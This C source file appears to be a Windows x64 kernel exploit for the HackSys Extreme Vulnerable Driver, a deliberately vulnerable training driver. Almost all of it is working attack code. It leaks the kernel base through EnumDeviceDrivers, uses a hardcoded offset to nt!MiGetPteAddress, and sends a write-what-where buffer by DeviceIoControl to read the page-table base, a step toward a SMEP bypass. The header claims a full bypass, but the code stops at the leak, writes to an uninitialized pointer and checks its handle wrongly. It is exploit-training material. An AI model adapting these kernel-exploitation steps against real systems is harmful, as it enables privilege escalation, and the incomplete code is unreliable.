// HackSys Extreme Vulnerable Driver Kernel Exploit (x64 Arbitrary Overwrite & SMEP Enabled utilizing KUSER_SHARED_DATA+0x800)
// Author: Connor McGarr
// Compilation on Windows via gcc: gcc Windows10_WriteWhatWhere.c -o exploit.exe -lpsapi

#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

#define IOCTL_CODE 0x0022200B

unsigned long long kernelBase(void)
{
	// Defining EnumDeviceDrivers() parameters
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;

	// Calling EnumDeviceDrivers()
	printf("[+] Calling EnumDeviceDrivers()...\n");

	BOOL baseofDrivers = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);

	// Error handling
	if (!baseofDrivers)
	{
		printf("[-] Error! Unable to invoke EnumDeviceDrivers(). Error: %d\n", GetLastError());
		exit(1);
	}

	// ntoskrnl.exe is the first module dumped in the array
	// Typcasting LPVOID to unsigned long long
	unsigned long long krnlBase = (unsigned long long)lpImageBase[0];

	// Print update for kernel base
	printf("[+] Found kernel leak!\n");
	printf("[+] ntoskrnl.exe is located at: 0x%llx\n", krnlBase);

	return krnlBase;
}

void exploitWork(void)
{

	// Return value of kernelBase,
	unsigned long long baseAddress = kernelBase();

	// Defining nt!MiGetPteAddress+0x13
	unsigned long long ntmigetpteAddress = baseAddress+0x1b607;
	printf("[+] nt!MiGetPteAddress+0x13 is located at: 0x%llx\n", ntmigetpteAddress);

	// Defining pointers to get the base of the PTEs
	unsigned long long *baseofPtes;
	PULONGLONG baseofptesPointer = (PULONGLONG)ntmigetpteAddress;

	// Defining buffer to send to driver
	char buf [0x10];
	size_t oneQword = 0x8;
	
	// Initializing buffer to junk to satisfy type error of memset
	memset(buf, 'A', 0x10);

	// Actual buffer for the exploit
	memcpy(buf, &baseofptesPointer, oneQword);
	memcpy(&buf[0x8], &baseofPtes, oneQword);

	// Obtaining handle to the driver
	printf("[+] Obtaining handle to the driver via CreateFileA()...\n");

	HANDLE drvHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0x0,
		NULL,
		0x3,
		0x0,
		NULL
	);

	// Error handling
	if (!drvHandle)
	{
		printf("[-] Error! Unable to obtain a handle to the driver. Error: %d\n", GetLastError());
		exit(1);
	}

	// Print update for HANDLE
	printf("[+] Handle to the driver: %d\n", drvHandle);

	// Sending buffer to the driver

	// Defining lpBytesReturned parameter
	DWORD lpBytesReturned;

	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf,
		sizeof(buf),
		NULL,
		0,
		&lpBytesReturned,
		NULL
		);

	printf("[+] Interacting with the driver...\n");

	// Defining variable to place base of PTEs
	ULONGLONG pteBase = *baseofPtes;

	// Print update for base of the PTEs
	printf("[+] Base of the page table entries: 0x%llx\n", pteBase);
}

int main()
{
	exploitWork();

	return 0;
}
